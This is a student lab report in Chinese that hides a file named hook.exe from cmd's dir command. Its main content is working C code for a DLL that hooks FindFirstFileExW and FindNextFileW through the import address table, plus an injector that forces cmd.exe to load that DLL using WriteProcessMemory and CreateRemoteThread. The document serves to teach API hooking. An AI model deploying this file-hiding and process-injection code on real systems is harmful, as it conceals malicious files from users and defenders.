# 期末作业

## 实验目的

更改dir时调用的`FindFirstFile`，每次出现"hook.exe"便抹掉此结果，使得cmd的dir命令看不到目录下的hook.exe

-------

### 背景

- Windows下遍历文件时用到的就是FindFirstFile 和FindNextFile

- FindFirstFile定义如下：

```c
HANDLE FindFirstFile(
  LPCTSTR lpFileName,               // file name
  LPWIN32_FIND_DATA lpFindFileData  // data buffer
);
```

- 函数成功时，返回一个有效句柄，失败时返回INVALID_HANDLE_VALUE
- 参数说明:

> - lpFileName：文件名，可以用通配符来指定遍历的文件类型，例如*.*表示所有文件， *.txt表示匹配所有的文本文件。还可以用？，？表示任意一个字符
> - lpFindData：是一个WIN32_FIND_DATA的结构，该结构说明了遍历到文件或者子目录的的属性，看一下定义：

```c
typedef struct _WIN32_FIND_DATA {
  DWORD    dwFileAttributes;   //文件属性，例如是目录还是文件， 是隐藏文件，加密文件， 只读文件等等
  FILETIME ftCreationTime;
  FILETIME ftLastAccessTime;
  FILETIME ftLastWriteTime;
  DWORD    nFileSizeHigh;    //文件大小的高32位，一般为0，即不超过4GB
  DWORD    nFileSizeLow;     //文件大小的低32位
  DWORD    dwReserved0;
  DWORD    dwReserved1;
  TCHAR    cFileName[ MAX_PATH ];   //文件名，不包括路径
  TCHAR    cAlternateFileName[ 14 ];
} WIN32_FIND_DATA, *PWIN32_FIND_DATA;
```

- FindNextFile定义如下

```c
BOOL FindNextFile(
  HANDLE hFindFile,                // search handle 
  LPWIN32_FIND_DATA lpFindFileData // data buffer
);
```

- 参数说明:

> - hFindFile：为FindFirstFile返回的句柄， 第二个参数和前面的一样，
> - 返回值：成功返回1，失败返回0. 调用GetLastError()可查看错误代码

## 实验过程

``` c
#include <windows.h>

#define FILENAME "hook.exe"
LONG IATHook(
    __in_opt void* pImageBase,
    __in_opt const char* pszImportDllName,
    __in const char* pszRoutineName,
    __in void* pFakeRoutine,
    __out HANDLE* phHook
);
LONG UnIATHook(__in HANDLE hHook);
void* GetIATHookOrign(__in HANDLE hHook);
typedef HANDLE(__stdcall *LPFN_FindFirstFileExW)(
    LPCSTR             lpFileName,
    FINDEX_INFO_LEVELS fInfoLevelId,
    LPVOID             lpFindFileData,
    FINDEX_SEARCH_OPS  fSearchOp,
    LPVOID             lpSearchFilter,
    DWORD              dwAdditionalFlags
    );
typedef BOOL(__stdcall *LPFN_FindNextFileW)(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData
    );
HANDLE g_hHook_FindFirstFileExW = NULL;
HANDLE g_hHook_FindNextFileW = NULL;
HANDLE __stdcall Fake_FindFirstFileExW(
    LPCSTR             lpFileName,
    FINDEX_INFO_LEVELS fInfoLevelId,
    LPVOID             lpFindFileData,
    FINDEX_SEARCH_OPS  fSearchOp,
    LPVOID             lpSearchFilter,
    DWORD              dwAdditionalFlags
){
    LPFN_FindFirstFileExW fnOrigin = (LPFN_FindFirstFileExW)GetIATHookOrign(g_hHook_FindFirstFileExW);
    HANDLE hFindFile = fnOrigin(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
    while (0 == wcscmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, TEXT(FILENAME))) {
        FindNextFileW(hFindFile, (LPWIN32_FIND_DATA)lpFindFileData);
    }
    return hFindFile;
}

BOOL __stdcall Fake_FindNextFileW(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData
) {
    LPFN_FindNextFileW fnOrigin = (LPFN_FindNextFileW)GetIATHookOrign(g_hHook_FindNextFileW);
    BOOL rv = fnOrigin(hFindFile, lpFindFileData);
    if (0 == wcscmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, TEXT(FILENAME))) {
    rv = fnOrigin(hFindFile, lpFindFileData);
}
    return rv;
}

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) {
switch (dwReason) {
case DLL_PROCESS_ATTACH:
IATHook(
    GetModuleHandle(NULL),
        "kernel32.dll",
        "FindFirstFileExW",
        Fake_FindFirstFileExW,
        &g_hHook_FindFirstFileExW
        );
IATHook(
GetModuleHandle(NULL),
    "kernel32.dll",
    "FindNextFileW",
    Fake_FindNextFileW,
    &g_hHook_FindNextFileW
    );
        break;
    case DLL_PROCESS_DETACH:
UnIATHook(g_hHook_FindFirstFileExW);
UnIATHook(g_hHook_FindNextFileW);
break;
}
return TRUE;
}
```

- 新建DLL类型项目，将上诉代码放在.cpp文件目录下，进行编译

- 在Debug文件中找到编译生成的dll文件，将其移动到C盘下

- 编写Inject.cpp，将注入的进程修改为cmd.exe

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int main() {
    char szDllName[] = "C:\\HookFindFileW.dll";
    char szExeName[] = "cmd.exe";

    /* Step 1 */
    PROCESSENTRY32 ProcessEntry = {};
    ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    bool bRet = Process32First(hProcessSnap, &ProcessEntry);
    DWORD dwProcessId = 0;
    while (bRet) {
        if (strcmp(szExeName, ProcessEntry.szExeFile) == 0) {
            dwProcessId = ProcessEntry.th32ProcessID;
            break;
        }
        bRet = Process32Next(hProcessSnap, &ProcessEntry);
        }
    if (0 == dwProcessId) {
        return 1;
    }

    /* Step 2 */
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (0 == hProcess) {
        return 1;
}

    /* Step 3 */
size_t length = strlen(szDllName) + 1;
char * pszDllFile = (char *)VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT, PAGE_READWRITE);
if (0 == pszDllFile) {
    return 1;
    }

    /* Step 4 */
    if (!WriteProcessMemory(hProcess, (PVOID)pszDllFile, (PVOID)szDllName, length, NULL)) {
        return 1;
    }

    /* Step 5 */
    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
    if (0 == pfnThreadRtn) {
        return 1;
    }

    /* Step 6 */
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, (PVOID)pszDllFile, 0, NULL);
    if (0 == hThread) {
        return 1;
    }

    /* Step 7 */
    WaitForSingleObject(hThread, INFINITE);
    printf("远程线程执行完毕!\n");
    VirtualFreeEx(hProcess, (PVOID)pszDllFile, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

## 实验结果

- 在控制台输入dir以后，可以看到hook.exe，运行inject.exe以后，已经无法找到hook.exe
